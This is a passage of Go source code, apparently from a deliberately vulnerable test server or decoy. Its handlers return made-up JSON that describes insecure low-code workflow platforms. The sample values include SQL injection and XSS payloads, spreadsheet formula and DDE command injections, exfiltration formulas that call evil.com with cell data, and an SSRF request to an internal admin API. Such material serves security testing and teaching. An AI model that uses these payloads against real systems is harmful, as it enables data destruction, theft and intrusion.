		"_warning": "Full PII (SSN, salary, bank details) visible in workflow execution history to 230 users. No masking or DLP.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC4: Authentication Failure
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeAuthFailure(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-auth-failure")

	resp := toJSON(map[string]interface{}{
		"form": map[string]interface{}{
			"id":          fmt.Sprintf("form-%s", h.randomHex(rng, 8)),
			"name":        "Customer Feedback Survey",
			"url":         fmt.Sprintf("https://forms.platform.com/f/%s", h.randomHex(rng, 10)),
			"access":      "public_anonymous",
			"captcha":     false,
			"rate_limit":  false,
		},
		"form_backend": map[string]interface{}{
			"connection_type":   "direct_database",
			"database":          "internal_crm_production",
			"table":             "customer_records",
			"write_access":      true,
			"read_access":       true,
			"authentication":    "none (form uses service connection)",
			"input_validation":  false,
		},
		"exposed_data": map[string]interface{}{
			"tables_accessible": []string{"customer_records", "orders", "payments", "support_tickets", "internal_notes"},
			"records_count":     rng.Intn(500000) + 100000,
			"pii_fields":        []string{"name", "email", "phone", "address", "payment_info"},
		},
		"workflow_trigger": map[string]interface{}{
			"type":            "on_form_submit",
			"actions":         []string{"write_to_database", "send_email", "update_crm", "trigger_webhook"},
			"error_handling":  "none",
			"retry_on_failure": true,
			"max_retries":     "unlimited",
		},
		"sql_injection_risk": map[string]interface{}{
			"parameterized_queries": false,
			"input_sanitization":    false,
			"sample_payload":       "'; DROP TABLE customer_records; --",
			"exploitable":          true,
		},
		"_warning": "Public anonymous form directly connected to internal CRM database. No authentication, validation, or rate limiting.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC5: Security Misconfiguration
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeMisconfig(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-misconfig")

	resp := toJSON(map[string]interface{}{
		"platform_config": map[string]interface{}{
			"tenant_id":   fmt.Sprintf("tenant-%s", h.randomHex(rng, 8)),
			"environment": "production",
			"plan":        "enterprise",
		},
		"sharing_settings": map[string]interface{}{
			"anonymous_access":        true,
			"external_sharing":        true,
			"share_with_anyone_link":  true,
			"guest_user_creation":     "automatic",
			"default_permission":      "editor",
			"link_expiration":         "never",
		},
		"network_security": map[string]interface{}{
			"ip_restrictions":         false,
			"allowed_ip_ranges":       []string{"0.0.0.0/0"},
			"vpn_required":            false,
			"conditional_access":      false,
			"geo_blocking":            false,
		},
		"authentication": map[string]interface{}{
			"mfa_required":            false,
			"sso_enforced":            false,
			"password_policy":         "default (no complexity)",
			"session_timeout_minutes": 0,
			"concurrent_sessions":     "unlimited",
		},
		"data_loss_prevention": map[string]interface{}{
			"dlp_policies":    false,
			"sensitivity_labels": false,
			"data_classification": false,
			"export_controls":  false,
			"copy_paste_restriction": false,
		},
		"environment_separation": map[string]interface{}{
			"dev_prod_separated": false,
			"dev_uses_prod_data": true,
			"staging_environment": false,
			"change_management":  false,
			"approval_required":  false,
		},
		"_warning": "Anonymous access enabled. No IP restrictions, MFA, or DLP. Development uses production data.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC6: Injection Handling Failure
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeInjection(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-injection")

	resp := toJSON(map[string]interface{}{
		"workflow": map[string]interface{}{
			"id":          fmt.Sprintf("wf-%s", h.randomHex(rng, 12)),
			"name":        "Spreadsheet Data Processor",
			"trigger":     "When file is uploaded to SharePoint",
			"status":      "active",
		},
		"spreadsheet_input": map[string]interface{}{
			"source":         "user_uploaded_excel",
			"sanitization":   false,
			"formula_check":  false,
			"macro_check":    false,
			"cell_validation": false,
		},
		"formula_injection_examples": []map[string]interface{}{
			{"cell": "A1", "value": "=CMD(\"calc.exe\")", "type": "command_execution", "blocked": false},
			{"cell": "B1", "value": "=HYPERLINK(\"http://evil.com/steal?data=\"&A1, \"Click\")", "type": "data_exfiltration", "blocked": false},
			{"cell": "C1", "value": "=IMPORTXML(\"http://evil.com/\"&A1&B1, \"//data\")", "type": "external_request", "blocked": false},
			{"cell": "D1", "value": "-cmd|'/C calc.exe'!Z0", "type": "dde_injection", "blocked": false},
			{"cell": "E1", "value": "=WEBSERVICE(\"http://internal-api.corp.com/admin/users\")", "type": "ssrf", "blocked": false},
		},
		"processing_pipeline": map[string]interface{}{
			"step_1": "Read Excel file cells",
			"step_2": "Evaluate formulas (no sandbox)",
			"step_3": "Write results to database",
			"step_4": "Send email notification with cell values (HTML rendered)",
		},
		"downstream_impact": map[string]interface{}{
			"email_xss":      "cell values rendered as HTML in notification emails",
			"database_sqli":  "cell values concatenated into SQL INSERT statements",
			"webhook_ssrf":   "cell values used in HTTP request URLs",
			"log_injection":  "cell values written to application logs unescaped",
		},
		"_warning": "User-uploaded spreadsheet formulas evaluated without sandboxing. Values flow into SQL, emails, and webhooks unsanitized.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC7: Vulnerable/Untrusted Components
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeVulnComponents(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-vuln-components")

	resp := toJSON(map[string]interface{}{
		"platform": map[string]interface{}{
			"name":      "AutomateFlow Enterprise",
			"tenant_id": fmt.Sprintf("tenant-%s", h.randomHex(rng, 8)),
		},
		"marketplace_connectors": []map[string]interface{}{
			{
				"name":         "DataSync Pro Connector",
				"publisher":    "unknown-publisher-42",
				"version":      "1.2.3",
				"latest":       "2.1.0",
				"installed":    "2022-06-15",
				"last_updated": "2022-06-15",
				"cves":         []string{"CVE-2023-44271", "CVE-2023-39128"},
				"severity":     "critical",
				"verified":     false,
				"permissions":  []string{"read_all_data", "write_all_data", "manage_connections", "access_secrets"},
				"downloads":    47,
				"reviews":      0,
			},
			{
				"name":         "PDF Generator Plus",
				"publisher":    "community-contrib",
				"version":      "0.8.1-beta",
				"latest":       "1.5.0",
				"installed":    "2023-01-10",
				"last_updated": "2023-01-10",
				"cves":         []string{"CVE-2024-11233"},
				"severity":     "high",
				"verified":     false,
				"permissions":  []string{"read_files", "write_files", "execute_code"},
				"downloads":    12,
				"reviews":      1,
			},
			{
				"name":         "Legacy CRM Bridge",
				"publisher":    "deprecated-integrations",
				"version":      "3.0.0",
				"latest":       "discontinued",
				"installed":    "2021-03-22",
				"last_updated": "2021-03-22",
				"cves":         []string{"CVE-2022-29885", "CVE-2023-20862", "CVE-2024-00123"},
				"severity":     "critical",
				"verified":     false,
				"permissions":  []string{"full_access"},
				"downloads":    3,
				"reviews":      0,
			},
		},
		"security_assessment": map[string]interface{}{
			"total_connectors":     23,
			"unverified":           18,
			"outdated":             15,
			"with_known_cves":      6,
			"abandoned":            4,
			"excessive_permissions": 11,
			"last_security_review":  "never",
		},
		"_warning": "6 marketplace connectors with known CVEs installed. 18 unverified publishers. No security review process.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC8: Data and Secret Handling Failure (Data Integrity)
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeDataIntegrity(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-data-integrity")

	resp := toJSON(map[string]interface{}{
		"workflow": map[string]interface{}{
			"id":          fmt.Sprintf("wf-%s", h.randomHex(rng, 12)),
			"name":        "Order Processing Pipeline",
			"trigger":     "HTTP webhook (public endpoint)",
			"status":      "active",
		},
		"input_handling": map[string]interface{}{
			"schema_validation": false,
			"type_checking":     false,
			"size_limits":       false,
			"max_payload_bytes": "unlimited",
			"content_type_check": false,
			"encoding_validation": false,
		},
		"accepted_payload_example": map[string]interface{}{
			"order_id":    "anything_goes",
			"amount":      "-99999.99",
			"currency":    "FAKE",
			"quantity":    "999999999",
			"email":       "not-an-email",
			"phone":       "'; DROP TABLE orders; --",
			"address":     "<script>alert('xss')</script>",
			"discount":    "100%%",
			"admin_flag":  true,
		},
		"downstream_actions": []map[string]interface{}{
			{"action": "Insert into database", "validation": "none", "sanitization": "none"},
			{"action": "Send confirmation email", "validation": "none", "html_escape": false},
			{"action": "Call payment API", "validation": "none", "amount_check": false},
			{"action": "Update inventory", "validation": "none", "negative_allowed": true},
			{"action": "Generate invoice PDF", "validation": "none", "template_injection": true},
		},
		"secret_management": map[string]interface{}{
			"api_keys_in_variables":  true,
			"encrypted_at_rest":      false,
			"visible_in_flow_editor": true,
			"logged_in_runs":         true,
			"shared_across_envs":     true,
			"rotation_policy":        "never",
		},
		"_warning": "No input validation on any field. Negative amounts, SQL injection, and XSS payloads all accepted and processed.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC9: Asset Management Failure (Insufficient Logging)
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeInsufficientLogging(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-insufficient-logging")

	resp := toJSON(map[string]interface{}{
		"platform": map[string]interface{}{
			"name":      "AutomateFlow Enterprise",
			"tenant_id": fmt.Sprintf("tenant-%s", h.randomHex(rng, 8)),
		},
		"logging_config": map[string]interface{}{
			"retention_days":      7,
			"log_level":           "error_only",
			"audit_log":           false,
			"admin_action_log":    false,
			"data_access_log":     false,
			"connection_log":      false,
		},
		"alerting": map[string]interface{}{
			"enabled":                  false,
			"email_alerts":             false,
			"siem_integration":         false,
			"webhook_notifications":    false,
			"anomaly_detection":        false,
			"threshold_alerts":         false,
		},
		"workflow_inventory": map[string]interface{}{
			"total_workflows":       342,
			"documented":            12,
			"with_owner":            87,
			"orphaned":              255,
			"last_inventory_audit":  "never",
			"approval_required":     false,
			"change_tracking":       false,
		},
		"connection_inventory": map[string]interface{}{
			"total_connections":     89,
			"shared_connections":    67,
			"unused_connections":    23,
			"with_embedded_creds":   45,
			"credential_rotation":   "never",
			"last_review":           "never",
		},
		"compliance_gaps": []map[string]interface{}{
			{"requirement": "SOC 2 - Logging", "status": "non-compliant", "detail": "7-day retention insufficient (90 days required)"},
			{"requirement": "GDPR - Data Access", "status": "non-compliant", "detail": "No data access logging"},
			{"requirement": "PCI DSS - Audit Trail", "status": "non-compliant", "detail": "No tamper-proof audit trail"},
			{"requirement": "HIPAA - Access Monitoring", "status": "non-compliant", "detail": "No access monitoring or alerting"},
		},
		"_warning": "7-day log retention, no alerting, no audit trail. 255 orphaned workflows. Non-compliant with SOC 2, GDPR, PCI DSS, HIPAA.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// LC10: Security Logging and Monitoring Failure (Security Gap)
// ---------------------------------------------------------------------------

func (h *Handler) serveLowCodeSecurityGap(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "lowcode-security-gap")

	resp := toJSON(map[string]interface{}{
		"workflow": map[string]interface{}{
			"id":          fmt.Sprintf("wf-%s", h.randomHex(rng, 12)),
			"name":        "Automated Data Export Pipeline",
			"created_by":  h.firstNames[rng.Intn(len(h.firstNames))] + "." + h.lastNames[rng.Intn(len(h.lastNames))],
			"status":      "active",
			"runs_daily":  rng.Intn(200) + 50,
		},
		"bypassed_controls": []map[string]interface{}{
			{"control": "Data Loss Prevention (DLP)", "status": "bypassed", "method": "workflow exports data to personal OneDrive via service connection"},
			{"control": "Conditional Access", "status": "bypassed", "method": "service account excluded from CA policies"},
			{"control": "Information Barriers", "status": "bypassed", "method": "cross-department data sharing via shared connection"},
			{"control": "Sensitivity Labels", "status": "bypassed", "method": "labels stripped when data flows through workflow"},
			{"control": "Email Gateway / Anti-Phishing", "status": "bypassed", "method": "workflow sends emails directly via Graph API"},
			{"control": "Network Segmentation", "status": "bypassed", "method": "workflow accesses internal APIs via cloud connector"},
			{"control": "Privileged Access Management", "status": "bypassed", "method": "admin actions performed via service account without PAM"},
		},
		"data_exfiltration_path": map[string]interface{}{
			"source":      "Internal SharePoint (confidential)",
			"step_1":      "Workflow reads documents via service connection",
			"step_2":      "Content extracted and stored in workflow variable",
			"step_3":      "Data written to personal OneDrive folder",
			"step_4":      "External sharing link generated automatically",
			"step_5":      "Link emailed to external address via Graph API",
			"detection":   "none",
		},
		"governance": map[string]interface{}{
			"security_review_required": false,
			"it_approval":             false,
			"data_classification":     false,
			"connection_approval":     false,
			"export_controls":         false,
			"dlp_enforced":            false,
			"shadow_it_detection":     false,
		},
		"impact": map[string]interface{}{
			"confidential_docs_exposed": rng.Intn(5000) + 1000,
			"external_shares_created":   rng.Intn(500) + 50,
			"security_controls_bypassed": 7,
			"detection_time":            "unknown (never detected)",
		},
		"_warning": "Workflow bypasses 7 enterprise security controls. Data exfiltrated from confidential SharePoint to external sharing. No detection.",
	})
	return h.lowcodeJSON(w, rng, http.StatusOK, resp)
}
